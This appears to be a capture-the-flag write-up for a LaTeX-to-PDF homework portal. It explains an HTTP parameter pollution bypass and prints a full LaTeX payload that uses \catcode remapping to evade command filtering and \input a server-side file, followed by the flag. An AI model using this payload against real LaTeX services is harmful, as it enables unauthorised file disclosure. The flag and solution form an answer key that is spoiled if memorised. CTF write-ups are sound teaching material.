# Homework Render
Challenge Description: 
`Isn't writing math homework hard? We have created an easy-to-use homework submission portal that allows you to type up your homework. We don't think anyone can get into this server for free answers!`
## Build Instructions

```sh
docker build -t hw_render .

docker run -p EXTERNAL_PORT:4433 hw_render
```
## Notes
Do not provide any source files for this challenge.
## Walkthrough
When you first visit the page, you will just see a textarea and a submit button. When you enter latex into the textarea and click submit, you will see that the latex gets rendered into a pdf. With this knowledge, you can try normal latex injection techinques, but you will notice that the server blocks any unsafe commands. The first step is to use http parameter pollution to bypass this check. If you enter a duplicate latex get parameter like this: latex=bob&latex=joe, the frontend server will process the first parameter and the backend server will process the second. Thus, if you put some valid latex into the first parameter, you can use some unsafe latex in the parameter. Through testing this bypass, you will see that only one latex command is unpatched in the backend server: \catcode. Through using several catcode characters, you can bypass the filtering and use the \input command to include the flag file and display the contents. The path to the flag file is in robots.txt which is hinted in a comment on the main page. 
Here is a sample of the final latex payload:
```txt
\documentclass[a4paper]{article}
\begin{document}
\catcode`@=0
\catcode`i=11
\catcode`n=11
\catcode`p=11
\catcode`u=11
\catcode`t=11
\catcode`I=11
\catcode`N=11
\catcode`P=11
\catcode`U=11
\catcode`T=11

@def@myInput#1{%
  @catcode`i=12
  @catcode`n=12
  @catcode`p=12
  @catcode`u=12
  @catcode`t=12
  @catcode`I=12
  @catcode`N=12
  @catcode`P=12
  @catcode`U=12
  @catcode`T=12
  @input{#1}
  @catcode`i=11
  @catcode`n=11
  @catcode`p=11
  @catcode`u=11
  @catcode`t=11
  @catcode`I=11
  @catcode`N=11
  @catcode`P=11
  @catcode`U=11
  @catcode`T=11
}

@myInput{/path/to/flag}
\end{document}
```
## Flag
```UMDCTF{M4th_iS_H4rd_bUt_LaT3X_1s_H4rd3r}```
